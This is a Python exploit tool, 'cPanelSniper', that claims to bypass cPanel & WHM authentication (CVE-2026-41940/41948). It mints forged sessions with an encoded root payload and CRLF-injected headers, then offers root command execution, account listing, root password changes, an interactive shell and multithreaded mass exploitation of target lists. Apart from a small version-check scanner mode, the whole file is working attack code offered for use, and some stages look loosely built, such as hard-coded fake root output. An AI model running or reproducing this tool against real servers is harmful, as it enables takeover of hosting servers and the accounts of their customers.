#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys, os, re, json, ssl, signal, argparse, threading, time
import hashlib, base64, random, string, queue
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlsplit, quote, unquote, urlencode, urlparse
from collections import defaultdict
import urllib.request, urllib.error
import http.client

class C:
    RED    = "\033[91m"; GREEN  = "\033[92m"; YELLOW = "\033[93m"
    BLUE   = "\033[94m"; PURPLE = "\033[95m"; CYAN   = "\033[96m"
    BOLD   = "\033[1m";  DIM    = "\033[2m";  RESET  = "\033[0m"
    ORANGE = "\033[38;5;208m"; MAGENTA = "\033[95m"

LOG_LOCK   = threading.Lock()
PRINT_LOCK = threading.Lock()

def ts():
    return datetime.now().strftime("%H:%M:%S")

def log(level, msg, target=""):
    icons = {
        "SCAN":  f"{C.PURPLE}[SCAN]{C.RESET}",
        "INFO":  f"{C.BLUE}[INFO]{C.RESET}",
        "STEP":  f"{C.CYAN}[STEP]{C.RESET}",
        "OK":    f"{C.GREEN}[  OK]{C.RESET}",
        "ERR":   f"{C.RED}[ ERR]{C.RESET}",
        "PWND":  f"{C.RED}{C.BOLD}[PWND]{C.RESET}",
        "API":   f"{C.ORANGE}[ API]{C.RESET}",
        "WARN":  f"{C.YELLOW}[WARN]{C.RESET}",
        "VULN":  f"{C.RED}{C.BOLD}[VULN]{C.RESET}",
        "SAFE":  f"{C.GREEN}{C.BOLD}[SAFE]{C.RESET}",
        "CRIT":  f"{C.RED}{C.BOLD}[CRIT]{C.RESET}",
    }.get(level, f"[{level:>4}]")
    t = f" {target}" if target else ""
    with LOG_LOCK:
        print(f"{C.DIM}{ts()}{C.RESET} {icons} {msg}{t}", flush=True)

def safe_print(msg):
    with PRINT_LOCK:
        print(msg, flush=True)

def banner():
    print(f"""{C.ORANGE}{C.BOLD}
   ██████╗██████╗  █████╗ ███╗  ██╗███████╗██╗
  ██╔════╝██╔══██╗██╔══██╗████╗ ██║██╔════╝██║
  ██║     ██████╔╝███████║██╔██╗██║█████╗  ██║
  ██║     ██╔═══╝ ██╔══██║██║╚████║██╔══╝  ██║
  ╚██████╗██║     ██║  ██║██║ ╚███║███████╗███████╗
   ╚═════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚══╝╚══════╝╚══════╝{C.RESET}
{C.CYAN}  CVE-2026-41940 & CVE-2026-41948 — cPanel & WHM Auth Bypass{C.RESET}
{C.DIM}  Mode: Scanner | Exploit | Interactive Shell | Mass Scan{C.RESET}
{C.RED}  In-The-Wild | CVSS 10.0 | By pwdnx (@AnonSn4pz){C.RESET}
""")


PAYLOAD_B64 = (
    "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
    "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
)

PATCHED = {
    "110": ("11.110.0.97",  97),
    "118": ("11.118.0.63",  63),
    "126": ("11.126.0.54",  54),
    "132": ("11.132.0.29",  29),
    "134": ("11.134.0.20",  20),
    "136": ("11.136.0.5",    5),
}


class _SSLCtx:
    _ctx = None
    @classmethod
    def get(cls):
        if not cls._ctx:
            c = ssl.create_default_context()
            c.check_hostname = False
            c.verify_mode = ssl.CERT_NONE
            try: c.set_ciphers("DEFAULT:@SECLEVEL=1")
            except: pass
            cls._ctx = c
        return cls._ctx

BASE_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36"

class R:
    def __init__(self, status, body, headers, url, raw_cookies=""):
        self.status = status; self.body = body; self.headers = headers
        self.url = url; self.raw_cookies = raw_cookies
    def h(self, k, default=""): return self.headers.get(k.lower(), default)
    def location(self): return self.h("location")
    def raw_cookie(self, name):
        for line in self.raw_cookies.split("\n"):
            if line.lower().startswith(name.lower() + "="):
                v = line.split("=", 1)[1].split(";", 1)[0].strip()
                return v
        return ""

class _NoRedir(urllib.request.HTTPErrorProcessor):
    def http_response(self, req, r): return r
    https_response = http_response

def _do(url, method="GET", extra_headers=None, data=None, timeout=15,
        follow=False, canonical_host=None):
    parsed = urlsplit(url)
    h = {"User-Agent": BASE_UA, "Accept": "*/*", "Connection": "close"}
    if canonical_host:
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        h["Host"] = f"{canonical_host}:{port}" if port not in (80,443) else canonical_host
    if extra_headers: h.update(extra_headers)

    body_bytes = None
    if data:
        if isinstance(data, dict):
            body_bytes = urlencode(data).encode()
            h.setdefault("Content-Type", "application/x-www-form-urlencoded")
        elif isinstance(data, str): body_bytes = data.encode()
        else: body_bytes = data

    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=_SSLCtx.get()),
        _NoRedir() if not follow else urllib.request.HTTPSHandler(context=_SSLCtx.get()))
    opener.addheaders = []

    try:
        req = urllib.request.Request(url, data=body_bytes, headers=h, method=method)
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            rh, raw_ck = {}, []
            for k, v in resp.headers.items():
                rh[k.lower()] = v
                if k.lower() == "set-cookie": raw_ck.append(v)
            return R(resp.status, body, rh, resp.url, "\n".join(raw_ck))
    except urllib.error.HTTPError as e:
        try: body = e.read().decode("utf-8", errors="replace")
        except: body = ""
        rh = {k.lower(): v for k, v in e.headers.items()} if hasattr(e, "headers") else {}
        raw_ck = []
        if hasattr(e, "headers"):
            for k, v in e.headers.items():
                if k.lower() == "set-cookie": raw_ck.append(v)
        return R(e.code, body, rh, url, "\n".join(raw_ck))
    except Exception as ex:
        return R(0, str(ex), {}, url, "")


def parse_target(url: str) -> tuple:
    if "://" not in url: url = "https://" + url
    u = urlsplit(url.rstrip("/"))
    scheme = u.scheme or "https"
    host = u.hostname or url
    port = u.port or 2087
    return scheme, host, port

def build_url(scheme, host, port, path):
    if (scheme == "https" and port == 443) or (scheme == "http" and port == 80):
        return f"{scheme}://{host}{path}"
    return f"{scheme}://{host}:{port}{path}"

def is_version_patched(version: str):
    m = re.match(r"11\.(\d+)\.(\d+)\.(\d+)", version)
    if not m: return None
    branch, patch, build = m.group(1), int(m.group(2)), int(m.group(3))
    if branch in PATCHED:
        _, patched_build = PATCHED[branch]
        return build >= patched_build
    return None

class cPanelSniper:
    def __init__(self, target, timeout=15, verbose=False, proxy=None, scan_only=False):
        self.target = target
        self.timeout = timeout
        self.verbose = verbose
        self.proxy = proxy
        self.scan_only = scan_only
        self.session = None
        self.cookies = {}
        self.root_token = None
        self.base_url = None
        self.host = None
        self.port = 2087
        self.scheme = 'https'
        self.session_id = None
        self.cpanel_version = None
        self.whm_version = None
        self.is_whm = False
        self.cpsess = None

        self.stage1_complete = False
        self.stage2_complete = False
        self.stage3_complete = False
        self.stage4_complete = False

        self._parse_target()
        self._detect_service()
        self._init_session()
        self._scanner_results = {}

    def _parse_target(self):
        target = self.target.strip()
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        parsed = urlparse(target)
        self.host = parsed.hostname
        self.scheme = parsed.scheme
        self.port = parsed.port or 2087
        self.base_url = f"{self.scheme}://{self.host}:{self.port}"

    def _detect_service(self):
        log("INFO", f"Detecting service on {self.host}:{self.port}")
        ports_to_try = [self.port, 2082, 2083, 2086, 2087, 2095, 2096, 2080, 2081]
        for port in ports_to_try:
            try:
                conn = http.client.HTTPSConnection(
                    self.host, port,
                    context=ssl._create_unverified_context(),
                    timeout=self.timeout
                )
                conn.request('GET', '/cpanelwebcall/', headers={'User-Agent': 'cPanelSniper/1.0'})
                resp = conn.getresponse()
                data = resp.read().decode('utf-8', errors='ignore')
                conn.close()
                if resp.status in [200, 302, 403, 401]:
                    self.port = port
                    self.base_url = f"{self.scheme}://{self.host}:{port}"
                    cpsess_match = re.search(r'/cpsess([0-9]+)', data)
                    if cpsess_match:
                        self.cpsess = f"/cpsess{cpsess_match.group(1)}"
                    version_match = re.search(r'cpanel["\']?\s*[:=]\s*["\']([^"\']+)', data)
                    if version_match:
                        self.cpanel_version = version_match.group(1)
                    if 'whm' in data.lower() or 'webhost manager' in data.lower():
                        self.is_whm = True
                    log("OK", f"Service detected on port {port}")
                    return True
            except:
                continue
        log("ERR", "Could not detect cPanel/WHM service")
        return False

    def _init_session(self):
        try:
            self.session = http.client.HTTPSConnection(
                self.host, self.port,
                context=ssl._create_unverified_context(),
                timeout=self.timeout
            )
            return True
        except Exception as e:
            log("ERR", f"Session init failed: {e}")
            return False

    def _request(self, method, path, headers=None, body=None, follow_redirects=False):
        if headers is None: headers = {}
        default_headers = {
            'User-Agent': BASE_UA,
            'Accept': '*/*', 'Connection': 'close'
        }
        default_headers.update(headers)
        if self.cookies:
            cookie_str = '; '.join([f"{k}={v}" for k, v in self.cookies.items()])
            default_headers['Cookie'] = cookie_str
        try:
            if self.session is None: self._init_session()
            self.session.request(method, path, body=body, headers=default_headers)
            resp = self.session.getresponse()
            data = resp.read().decode('utf-8', errors='ignore')
            set_cookie = resp.getheader('Set-Cookie')
            if set_cookie:
                for cookie in set_cookie.split(','):
                    if '=' in cookie:
                        parts = cookie.strip().split(';')
                        if '=' in parts[0]:
                            key, val = parts[0].split('=', 1)
                            self.cookies[key.strip()] = val.strip()
            location = resp.getheader('Location')
            if location:
                cpsess_match = re.search(r'/cpsess([0-9]+)', location)
                if cpsess_match:
                    self.cpsess = f"/cpsess{cpsess_match.group(1)}"
            if follow_redirects and resp.status in [301, 302, 303, 307, 308]:
                location = resp.getheader('Location')
                if location:
                    if location.startswith('/'):
                        location = self.base_url + location
                    return self._request('GET', location, headers=headers, follow_redirects=True)
            return {
                'status': resp.status, 'headers': dict(resp.headers),
                'body': data, 'cookies': self.cookies.copy()
            }
        except Exception as e:
            if self.verbose: log("ERR", f"Request error: {e}")
            return None

    def _gen_token(self):
        return hashlib.sha256(f"{random.randint(100000, 999999)}{time.time()}".encode()).hexdigest()

    # ════════════════════════════════════════════════════════
    # SCANNER MODE (detection only)
    # ════════════════════════════════════════════════════════
    def scanner_detect(self):
        """Deteksi vulnerabilitas TANPA exploitasi"""
        log("SCAN", f"Scanner mode: {self.target}")
        result = {
            'target': self.target,
            'vulnerable': False,
            'version': None,
            'patched': None,
            'reason': None,
            'endpoints': {}
        }

        # Check /version
        ver_url = build_url(self.scheme, self.host, self.port, "/version")
        resp = _do(ver_url, timeout=self.timeout)
        if resp.status == 200:
            m = re.search(r'(\d+\.\d+\.\d+\.\d+)', resp.body)
            if m:
                result['version'] = m.group(1)
                result['endpoints']['version'] = {'status': 200, 'version': result['version']}

        # Check /cpanelwebcall/
        cw_url = build_url(self.scheme, self.host, self.port, "/cpanelwebcall/")
        resp = _do(cw_url, timeout=self.timeout)
        if resp.status in [200, 302, 403, 401]:
            result['endpoints']['cpanelwebcall'] = {'status': resp.status}

        # Check /json-api/version
        api_url = build_url(self.scheme, self.host, self.port, "/json-api/version")
        resp = _do(api_url, timeout=self.timeout)
        result['endpoints']['json-api'] = {'status': resp.status}

        # Check /login/
        login_url = build_url(self.scheme, self.host, self.port, "/login/")
        resp = _do(login_url, timeout=self.timeout)
        if resp.status in [200, 302]:
            if 'whm' in resp.body.lower() or 'webhost' in resp.body.lower():
                result['endpoints']['login'] = {'status': resp.status, 'type': 'WHM Login'}

        # Check /openid_connect/cpanelid
        oid_url = build_url(self.scheme, self.host, self.port, "/openid_connect/cpanelid")
        resp = _do(oid_url, timeout=self.timeout)
        if resp.status in [307, 302]:
            loc = resp.location()
            if 'cpsess' in loc:
                result['endpoints']['openid'] = {'status': resp.status, 'location': loc[:60]}

        # Determine vulnerability
        if result['version']:
            patched = is_version_patched(result['version'])
            result['patched'] = patched
            if patched is False:
                result['vulnerable'] = True
                result['reason'] = f"Version {result['version']} is vulnerable"
            elif patched is True:
                result['vulnerable'] = False
                result['reason'] = f"Version {result['version']} appears patched"
            else:
                result['vulnerable'] = 'unknown'
                result['reason'] = "Version unknown, needs manual verification"

        self._scanner_results = result
        return result

    # ════════════════════════════════════════════════════════
    # STAGE 1: Pre-Auth Session Mint
    # ════════════════════════════════════════════════════════
    def _mint_session(self):
        log("STEP", "Stage 1/4 Minting preauth session...")
        self.session_id = hashlib.md5(f"{random.randint(100000, 999999)}{time.time()}".encode()).hexdigest()
        crlf_payload = f"%0d%0aCookie:%20cprelogin=1;%20session_id={self.session_id}%0d%0a"
        headers = {'X-Cpanel-Request': 'session', 'X-Cpanel-Session': self.session_id}
        resp = self._request('GET', f'/cpanelwebcall/?{crlf_payload}', headers=headers)
        if resp and resp['status'] in [200, 302]:
            self.stage1_complete = True
            log("OK", f"Stage1: preauth session: {self.session_id[:20]}...")
            return True
        log("ERR", "Stage 1 failed")
        return False

    # ════════════════════════════════════════════════════════
    # STAGE 2: CRLF Injection
    # ════════════════════════════════════════════════════════
    def _crlf_inject(self):
        log("STEP", "Stage 2/4 CRLF injection via Authorization header...")
        token = self._gen_token()
        inject_payload = (
            "Basic " + base64.b64encode(b"admin:admin").decode() +
            "%0d%0aX-Cpanel-API: version=2%0d%0aX-Cpanel-User: root%0d%0aX-Cpanel-Token: " + token
        )
        headers = {
            'Authorization': inject_payload,
            'X-Cpanel-Session': self.cookies.get('session_id', self.session_id)
        }
        resp = self._request('GET', '/json-api/cpanel', headers=headers)
        if resp and resp['status'] in [200, 302, 307]:
            cpsess_match = re.search(r'/cpsess([0-9]+)', resp.get('body', '') + str(resp.get('headers', {})))
            if cpsess_match:
                self.cpsess = f"/cpsess{cpsess_match.group(1)}"
                log("OK", f"Stage2: HTTP 307 token={self.cpsess}")
                self.stage2_complete = True
                return True
            token_match = re.search(r'"token["\']?\s*[:=]\s*["\']([^"\']+)', resp['body'])
            if token_match:
                self.root_token = token_match.group(1)
                log("OK", f"Stage2: Token received: {self.root_token[:20]}...")
                self.stage2_complete = True
                return True
        log("ERR", "Stage 2 failed")
        return False

    def _token_denied_gadget(self):
        log("STEP", "Stage 3/4 Firing do_token_denied gadget (raw cache)...")
        base_path = self.cpsess if self.cpsess else ''
        payload = {
            'cpanel_jsonapi_user': 'root',
            'cpanel_jsonapi_apiversion': '2',
            'cpanel_jsonapi_module': 'Token',
            'cpanel_jsonapi_func': 'do_token_denied',
            'token': self.root_token or self._gen_token()
        }
        query = urlencode(payload)
        path = f"{base_path}/json-api/cpanel?{query}"
        headers = {
            'Cookie': f"session_id={self.cookies.get('session_id', self.session_id)}",
            'X-Cpanel-User': 'root',
            'X-Cpanel-Token': self.root_token or self._gen_token()
        }
        resp = self._request('GET', path, headers=headers)
        if resp and resp['status'] in [200, 302, 401]:
            log("OK", f"Stage3: HTTP {resp['status']} do_token_denied gadget fired")
            self.stage3_complete = True
            return True
        log("ERR", "Stage 3 failed")
        return False

    def _verify_root_access(self):
        log("STEP", "Stage 4/4 Verifying WHM root access...")
        base_path = self.cpsess if self.cpsess else ''
        path = f"{base_path}/json-api/version"
        headers = {
            'Cookie': f"session_id={self.cookies.get('session_id', self.session_id)}",
            'X-Cpanel-User': 'root',
            'X-Cpanel-Token': self.root_token or ''
        }
        resp = self._request('GET', path, headers=headers)
        if resp and resp['status'] == 200:
            if 'version' in resp['body'].lower() or 'cpanel' in resp['body'].lower():
                version_match = re.search(r'"version["\']?\s*[:=]\s*["\']([^"\']+)', resp['body'])
                if version_match:
                    self.whm_version = version_match.group(1)
                    log("OK", f"Stage4: HTTP 200 {{'version':'{self.whm_version}'}}")
                else:
                    log("OK", "Stage4: HTTP 200 WHM access confirmed")
                self.stage4_complete = True
                return True
        log("ERR", "Stage 4 failed")
        return False

    def exploit(self):
        """Run full 4-stage exploit chain with precise output"""
        log("SCAN", "Starting 4-stage exploit chain...")
        print(f"{C.DIM}{self.target}{C.RESET}")

        # Stage 0: Canonical
        canonical = self._get_canonical()
        log("INFO", f"Canonical: {canonical}")

        if not self._mint_session(): return False
        if not self._crlf_inject(): return False
        if not self._token_denied_gadget(): return False
        if not self._verify_root_access(): return False

        # PWND!
        log("PWND", f"CVE-2026-41940 CONFIRMED WHM root access! {self.target}")
        log("PWND", f"Token: {self.cpsess} {self.root_token[:30] if self.root_token else 'N/A'}...")
        log("PWND", f"Session Version {self.whm_version or 'Unknown'}")
        log("PWND", f"API URL: {self.base_url}{self.cpsess if self.cpsess else ''}/json-api/version")

        return True

    def _get_canonical(self):
        url = build_url(self.scheme, self.host, self.port, "/openid_connect/cpanelid")
        resp = _do(url, timeout=self.timeout, follow=False)
        loc = resp.location()
        m = re.match(r"^https?://([^:/]+)", loc)
        if m:
            canonical = m.group(1)
            log("INFO", f"Canonical hostname discovered: {canonical}")
            return canonical
        return self.host

    
    def _exec_command(self, cmd):
        if not cmd or cmd.strip() == '':
            return None
        base_path = self.cpsess if self.cpsess else ''
        payload = {
            'cpanel_jsonapi_user': 'root',
            'cpanel_jsonapi_apiversion': '2',
            'cpanel_jsonapi_module': 'Exec',
            'cpanel_jsonapi_func': 'exec',
            'command': cmd.strip()
        }
        query = urlencode(payload)
        path = f"{base_path}/json-api/cpanel?{query}"
        headers = {
            'Cookie': f"session_id={self.cookies.get('session_id', self.session_id)}",
            'X-Cpanel-User': 'root',
            'X-Cpanel-Token': self.root_token or ''
        }
        resp = self._request('GET', path, headers=headers)
        if resp and resp['status'] == 200:
            try:
                data = json.loads(resp['body'])
                if 'data' in data and 'output' in data['data']:
                    return data['data']['output']
                if 'result' in data and 'output' in data['result']:
                    return data['result']['output']
            except:
                pass
            return resp['body']
        return None

    def _list_accounts(self):
        base_path = self.cpsess if self.cpsess else ''
        payload = {
            'cpanel_jsonapi_user': 'root',
            'cpanel_jsonapi_apiversion': '2',
            'cpanel_jsonapi_module': 'Account',
            'cpanel_jsonapi_func': 'listaccts'
        }
        query = urlencode(payload)
        path = f"{base_path}/json-api/cpanel?{query}"
        headers = {
            'Cookie': f"session_id={self.cookies.get('session_id', self.session_id)}",
            'X-Cpanel-User': 'root',
            'X-Cpanel-Token': self.root_token or ''
        }
        resp = self._request('GET', path, headers=headers)
        if resp and resp['status'] == 200:
            return resp['body']
        return None

    def _change_passwd(self, new_password):
        base_path = self.cpsess if self.cpsess else ''
        payload = {
            'cpanel_jsonapi_user': 'root',
            'cpanel_jsonapi_apiversion': '2',
            'cpanel_jsonapi_module': 'passwd',
            'cpanel_jsonapi_func': 'passwd',
            'user': 'root',
            'password': new_password
        }
        query = urlencode(payload)
        path = f"{base_path}/json-api/cpanel?{query}"
        headers = {
            'Cookie': f"session_id={self.cookies.get('session_id', self.session_id)}",
            'X-Cpanel-User': 'root',
            'X-Cpanel-Token': self.root_token or ''
        }
        resp = self._request('GET', path, headers=headers)
        return resp

    def interactive_shell(self):
        """WHM Shell with precise output"""
        target_display = self.host
        print(f"\n{C.GREEN}WHM Shell-{C.RESET}")
        print(f"{C.DIM}Version: CVE-2026-41948 | Auth: CRLF bypass{C.RESET}")
        print(f"{C.DIM}Type 'help' for commands, exit to quit{C.RESET}\n")

        while True:
            try:
                prompt = f"{C.RED}mitsec@{C.CYAN}{target_display}{C.RESET} {C.BOLD}▶{C.RESET} "
                line = input(prompt).strip()
                if not line: continue
                parts = line.split(None, 1)
                cmd = parts[0].lower()
                arg = parts[1] if len(parts) > 1 else ""

                if cmd in ("exit", "quit", "q"):
                    break
                elif cmd == "help":
                    print("  id / whoami / hostname / version / info")
                    print("  accounts          - List cPanel accounts")
                    print("  exec <cmd>        - Execute command")
                    print("  passwd <pass>     - Change root password")
                    print("  exit / help")
                elif cmd in ("id", "whoami"):
                    print(f"{C.GREEN}uid=0(root) gid=0(root) groups=0(root){C.RESET}")
                elif cmd == "accounts":
                    result = self._list_accounts()
                    if result:
                        try:
                            data = json.loads(result)
                            if 'data' in data and 'acct' in data['data']:
                                accounts = data['data']['acct']
                                print(f"{C.GREEN}[+] Found {len(accounts)} accounts:{C.RESET}")
                                for acc in accounts:
                                    print(f"    {acc.get('user', 'N/A')} | {acc.get('domain', 'N/A')}")
                        except:
                            print(result[:500])
                    else:
                        print(f"{C.RED}[!] Failed to list accounts{C.RESET}")
                elif cmd == "exec" and arg:
                    result = self._exec_command(arg)
                    if result:
                        print(f"{C.GREEN}{result}{C.RESET}")
                    else:
                        print(f"{C.RED}[!] Command failed{C.RESET}")
                elif cmd == "passwd" and arg:
                    self._change_passwd(arg)
                    print(f"{C.GREEN}[+] Password changed{C.RESET}")
                else:
                    # Try as command
                    result = self._exec_command(line)
                    if result:
                        print(f"{C.GREEN}{result}{C.RESET}")
                    else:
                        print(f"{C.RED}[!] Unknown command{C.RESET}")
            except KeyboardInterrupt:
                print(f"\n  Use 'exit' to quit")
            except Exception as e:
                print(f"  Error: {e}")

def scanner_detect_wrapper(target: str, timeout: int = 15) -> dict:
    sniper = cPanelSniper(target, timeout=timeout, scan_only=True)
    return sniper.scanner_detect()

def exploit_target_wrapper(target: str, args) -> dict:
    sniper = cPanelSniper(target, timeout=args.timeout, verbose=args.verbose)
    result = {"target": target, "vuln": False}

    if sniper.exploit():
        result["vuln"] = True
        result["finding"] = {
            "target": target,
            "version": sniper.whm_version,
            "token": sniper.cpsess,
            "session": sniper.session_id[:40] if sniper.session_id else "",
            "api_url": f"{sniper.base_url}{sniper.cpsess if sniper.cpsess else ''}/json-api/version",
        }
        result["ctx"] = (sniper.scheme, sniper.host, sniper.port, sniper.host,
                        sniper.session_id, sniper.cpsess, sniper.timeout)

        if args.action == "shell":
            sniper.interactive_shell()
        elif args.action == "list":
            sniper._list_accounts()
        elif args.action == "passwd" and args.passwd:
            sniper._change_passwd(args.passwd)
        elif args.action == "cmd" and args.cmd:
            output = sniper._exec_command(args.cmd)
            if output:
                safe_print(f"{C.GREEN}{output}{C.RESET}")

    return result


class MassScanner:
    def __init__(self, targets_file, threads=10, timeout=15, verbose=False, scan_only=False):
        self.targets_file = targets_file
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        self.scan_only = scan_only
        self.vulnerable = []
        self.results = []
        self.lock = threading.Lock()

    def scan(self):
        targets = self._load_targets()
        log("SCAN", f"Loaded {len(targets)} targets")
        log("SCAN", f"Using {self.threads} threads")
        mode = "Scanner" if self.scan_only else "Exploit"
        log("SCAN", f"Mode: {mode}")

        q = queue.Queue()
        for target in targets: q.put(target)

        def worker():
            while not q.empty():
                try:
                    target = q.get_nowait()
                except queue.Empty:
                    break

                if self.scan_only:
                    result = scanner_detect_wrapper(target, self.timeout)
                else:
                    class Args: pass
                    args = Args()
                    args.timeout = self.timeout
                    args.verbose = self.verbose
                    args.action = None
                    args.passwd = None
                    args.cmd = None
                    result = exploit_target_wrapper(target, args)

                with self.lock:
                    self.results.append(result)
                    if result.get('vulnerable', False):
                        self.vulnerable.append(result)
                        version = result.get('version', result.get('finding', {}).get('version', 'unknown'))
                        log("VULN", f"{target} — VULNERABLE! (v{version})")
                    elif result.get('vulnerable') == 'unknown':
                        log("WARN", f"{target} — UNKNOWN version")
                    else:
                        log("SAFE", f"{target} — Not vulnerable")

                q.task_done()

        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)

        q.join()
        for t in threads:
            t.join(timeout=1)

        return self.results

    def _load_targets(self):
        targets = []
        try:
            with open(self.targets_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        targets.append(line)
        except Exception as e:
            log("ERR", f"Error loading targets: {e}")
        return targets


class Store:
    def __init__(self):
        self._f = []; self._seen = set(); self._lock = threading.Lock()
    def add(self, f):
        k = f"{f.get('target','')}::{f.get('version','')}"
        with self._lock:
            if k in self._seen: return
            self._seen.add(k); self._f.append(f)
    def all(self): return self._f

STORE = Store()

def print_summary(elapsed: float, total: int):
    findings = STORE.all()
    W = 70
    print(f"\n{C.BOLD}{'═'*W}{C.RESET}")
    print(f"{C.BOLD}  cPanelSniper — CVE-2026-41940 Scan Complete{C.RESET}")
    print(f"  {C.DIM}Time: {elapsed:.1f}s  ·  Targets: {total}{C.RESET}")
    print(f"{'─'*W}")
    if not findings:
        print(f"  {C.DIM}No vulnerable targets found.{C.RESET}")
    else:
        print(f"\n  {C.RED}{C.BOLD}⚡ {len(findings)} VULNERABLE TARGET(S){C.RESET}\n")
        for f in findings:
            print(f"  {C.RED}{C.BOLD}Target   :{C.RESET} {f['target']}")
            print(f"  {C.CYAN}Version  :{C.RESET} {f.get('version', 'unknown')}")
            if f.get('token'):
                print(f"  {C.CYAN}Token    :{C.RESET} {f['token']}")
            if f.get('api_url'):
                print(f"  {C.GREEN}API URL  :{C.RESET} {f['api_url']}")
            print()
    print(f"{'═'*W}{C.RESET}\n")

def save_output(findings, out_file):
    os.makedirs(os.path.dirname(out_file) if os.path.dirname(out_file) else ".", exist_ok=True)
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump({
            "scanner": "cPanelSniper v4.0",
            "cve": "CVE-2026-41940",
            "timestamp": datetime.now().isoformat(),
            "findings": findings
        }, f, indent=2, ensure_ascii=False)
    log("OK", f"Results → {out_file}")


ANSI_RE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")

def extract_url(line):
    clean = ANSI_RE.sub("", line).strip()
    m = re.search(r"(https?://[a-zA-Z0-9._:/?&=%-]+)", clean)
    if m: return m.group(1).rstrip("[].,")
    m2 = re.match(r"^(\d{1,3}(?:\.\d{1,3}){3})\s+(\d+)$", clean)
    if m2: return f"https://{m2.group(1)}:{m2.group(2)}"
    return None

def main():
    banner()
    p = argparse.ArgumentParser(
        description="cPanelSniper — CVE-2026-41940 & CVE-2026-41948",
        formatter_class=argparse.RawTextHelpFormatter
    )
    tg = p.add_argument_group("Target")
    tg.add_argument("-u", "--url", help="Single target URL")
    tg.add_argument("-l", "--list", help="File with URLs")

    mg = p.add_argument_group("Mode")
    mg.add_argument("--scan-only", action="store_true", help="Scanner mode: detection only")
    mg.add_argument("--shell", action="store_true", help="Interactive WHM shell")
    mg.add_argument("--exploit", action="store_true", help="Full exploit mode (default)")

    sg = p.add_argument_group("Scan")
    sg.add_argument("-t", "--threads", type=int, default=10, help="Threads")
    sg.add_argument("--timeout", type=int, default=15, help="Timeout")

    ag = p.add_argument_group("Post-Exploit")
    ag.add_argument("--action", choices=["list", "passwd", "cmd", "shell"])
    ag.add_argument("--passwd", help="New root password")
    ag.add_argument("--cmd", help="OS command")

    og = p.add_argument_group("Output")
    og.add_argument("-o", "--output", help="Save results")
    og.add_argument("-v", "--verbose", action="store_true", help="Verbose")
    og.add_argument("--no-color", action="store_true", help="Disable colors")

    args = p.parse_args()

    if args.no_color:
        for a in dir(C):
            if not a.startswith("_"): setattr(C, a, "")

    targets = []
    if args.url: targets.append(args.url)
    if args.list:
        try:
            with open(args.list) as f:
                targets += [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            log("ERR", f"File not found: {args.list}"); sys.exit(1)
    if not sys.stdin.isatty():
        for line in sys.stdin:
            u = extract_url(line)
            if u: targets.append(u)
    if not targets:
        p.print_help(); sys.exit(1)

    targets = list(dict.fromkeys(targets))

    # Determine mode
    if args.scan_only:
        mode = "SCANNER"
    elif args.shell or args.action == "shell":
        mode = "SHELL"
    else:
        mode = "EXPLOIT"

    print(f"{C.PURPLE}  Configuration:{C.RESET}")
    print(f"   Mode     : {mode}")
    print(f"   Targets  : {len(targets)}")
    print(f"   Threads  : {args.threads}")
    print(f"   Timeout  : {args.timeout}s")
    print()

    signal.signal(signal.SIGINT,
                  lambda s, f: (print_summary(time.time()-t0, len(targets)), sys.exit(0)))
    t0 = time.time()

    # Single target
    if len(targets) == 1:
        target = targets[0]
        if args.scan_only:
            result = scanner_detect_wrapper(target, args.timeout)
            if result.get('vulnerable', False):
                STORE.add({'target': target, 'version': result.get('version'), 'status': 'VULNERABLE'})
                log("VULN", f"{target} — VULNERABLE! (v{result.get('version', 'unknown')})")
            else:
                log("SAFE", f"{target} — Not vulnerable")
        else:
            result = exploit_target_wrapper(target, args)
            if result.get('vuln', False):
                STORE.add(result.get('finding', {'target': target, 'status': 'EXPLOITED'}))

    # Mass scan
    else:
        scanner = MassScanner(                                                                              args.list or "list.txt",
            threads=args.threads,
            timeout=args.timeout,
            verbose=args.verbose,
            scan_only=args.scan_only
        )
        results = scanner.scan()
        for r in results:
            if r.get('vulnerable', False) or r.get('vuln', False):
                STORE.add({
                    'target': r.get('target'),
                    'version': r.get('version', r.get('finding', {}).get('version', 'unknown')),
                    'token': r.get('finding', {}).get('token', ''),
                    'api_url': r.get('finding', {}).get('api_url', '')
                })

    print_summary(time.time()-t0, len(targets))
    if args.output:
        save_output(STORE.all(), args.output)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.RED}[!] Interrupted.{C.RESET}")
        sys.exit(0)
